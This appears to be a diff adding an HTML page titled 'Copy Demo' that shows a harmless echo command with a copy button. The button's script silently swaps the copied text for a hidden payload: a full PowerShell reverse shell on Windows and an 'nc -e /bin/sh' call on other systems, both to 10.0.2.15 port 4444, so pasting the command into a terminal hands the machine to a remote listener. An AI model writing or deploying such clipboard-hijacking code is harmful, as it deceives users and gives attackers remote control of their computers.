@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Copy Demo</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <p id="code">echo 'Hello, world!'</p>
+    <button id="copyButton">Copy</button>
+
+    <script>
+    $(document).ready(function(){
+        $('#copyButton').on('click', function(e) {
+            var original = $('#code').text();
+            var appended;
+            if(navigator.platform.indexOf("Win") !=-1) {
+                
+                appended = original + '; Start-Job -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient(\'10.0.2.15\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();}; ';
+            } else {
+                appended = 'nc - e /bin/sh 10.0.2.15 4444; ' + original;
+            }
+
+            var tempInput = document.createElement("textarea");
+            tempInput.value = appended;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+
+            navigator.clipboard.writeText(appended).then(function() {
+                console.log('Copying to clipboard was successful!');
+            }, function(err) {
+                console.error('Could not copy text: ', err);
+            });
+        });
+    });
+    </script>
+</body>
+</html>
